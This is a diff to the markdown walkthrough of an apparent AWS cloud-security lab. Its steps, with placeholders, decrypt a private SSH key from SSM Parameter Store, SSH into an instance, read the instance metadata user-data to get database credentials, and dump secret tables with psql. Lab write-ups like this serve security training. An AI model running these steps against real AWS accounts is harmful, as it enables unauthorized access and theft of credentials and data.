@@ -465,22 +465,22 @@ Find out what else solo can do before moving on and solving this again as Lando
 9. Access the private key parameter     
 `aws ssm get-parameter --name <private-key> --profile solo`   
 Copying this value will result in an invalid ssh key format  
-10. Access the private key paramater without the newline characters
+10. Access the private key paramater without the newline characters    
 `aws ssm get-parameter --name <private-key> --with-decryption --query Parameter.Value --profile solo --output text`
-11. Copy the private key value and paste it into a new file
+11. Copy the private key value and paste it into a new file    
 `vim ssh_key`    
-12. Adjust key permissions in order to use it for ssh
+12. Adjust key permissions in order to use it for ssh    
 `chmod 400 ssh_key`
-11. SSH into the described instance
+13. SSH into the described instance    
 `ssh -i ssh_key ubuntu@<instanceIP>1`
-12. Access the metadata from the AWS system    
+14. Access the metadata from the AWS system    
 `curl http://169.254.169.254/latest/user-data`  
-DB Credentials Obtained!
-13. Access the database    
+DB Credentials Obtained!  
+15. Access the database    
 `psql postgresql://<usr>:<pass>@<rds-instance>:5432/<db_name>`
-14. View the tables    
+16. View the tables    
 `/dt`    
-15. Obtain the secrets    
+17. Obtain the secrets    
 `select * from <table_name>;`
 
 **Goal Achieved as Solo**
